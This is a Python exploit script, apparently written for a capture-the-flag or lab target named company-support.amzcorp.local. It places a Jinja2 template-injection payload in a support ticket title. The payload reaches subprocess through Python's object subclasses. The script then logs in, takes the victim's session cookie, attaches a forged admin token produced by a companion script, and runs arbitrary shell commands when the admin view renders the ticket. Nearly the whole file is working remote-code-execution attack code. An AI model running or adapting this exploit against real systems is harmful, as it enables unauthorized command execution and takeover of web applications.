import os
#!/usr/bin/env python3
"""Run commands on company-support via SSTI in ticket title."""
import argparse
import html
import re
import subprocess
import sys

import requests

BASE = "http://company-support.amzcorp.local"
TITLE = (
    "{{ dict.mro()[-1].__subclasses__()[276]"
    "(request.args.c,shell=True,stdout=-1).communicate()[0].strip() }}"
)


def get_csrf(text: str) -> str:
    m = re.search(r'name="csrf_token"[^>]*value="([^"]+)"', text)
    return m.group(1)


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("--cmd", required=True)
    parser.add_argument("--ticket", type=int, default=0)
    parser.add_argument("--user", default="ssti001")
    parser.add_argument("--password", default=os.environ.get("REGISTER_PASSWORD", ""))
    args = parser.parse_args()

    tony = subprocess.check_output(
        ["python3", "scripts/jwt_nonce_reuse.py", "--fresh"], text=True
    ).strip().split("\n")[-1]

    s = requests.Session()
    r = s.get(f"{BASE}/login")
    s.post(
        f"{BASE}/login",
        data={
            "csrf_token": get_csrf(r.text),
            "username": args.user,
            "password": args.password,
            "login": "Sign IN",
        },
    )

    tid = args.ticket
    if not tid:
        s.post(f"{BASE}/users/tickets/create", data={"title": TITLE, "message": "rce"})
        r = s.get(f"{BASE}/user/tickets")
        tid = max(map(int, re.findall(r"/users/tickets/edit/(\d+)", r.text)))

    s.post(f"{BASE}/users/tickets/edit/{tid}", data={"title": TITLE, "message": "rce"})
    sess = s.cookies.get("session")

    admin = requests.Session()
    admin.cookies.set("session", sess)
    admin.cookies.set("aws_auth", tony)
    r = admin.get(f"{BASE}/admin/tickets/view/{tid}", params={"c": args.cmd}, timeout=120)
    h2 = re.search(r"<h2[^>]*>(.*?)</h2>", r.text, re.S)
    if not h2:
        print(r.text[:500], file=sys.stderr)
        return 1
    out = html.unescape(re.sub(r"<[^>]+>", "", h2.group(1)))
    if out.startswith("b'") and out.endswith("'"):
        out = out[2:-1]
    print(out)
    return 0


if __name__ == "__main__":
    sys.exit(main())
